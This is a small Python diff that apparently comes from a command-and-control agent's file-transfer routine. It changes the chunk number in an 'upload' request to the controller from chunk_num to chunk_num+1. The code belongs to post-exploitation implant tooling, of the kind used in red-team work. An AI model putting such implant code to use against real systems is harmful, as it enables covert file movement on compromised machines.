@@ -6,7 +6,7 @@
             if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                 return "Job stopped."
             data = { "action": "post_response", "responses": [
-                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num }, "task_id": task_id }
+                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
                 ]}
             response = self.postMessageAndRetrieveResponse(data)
             chunk = response["responses"][0]
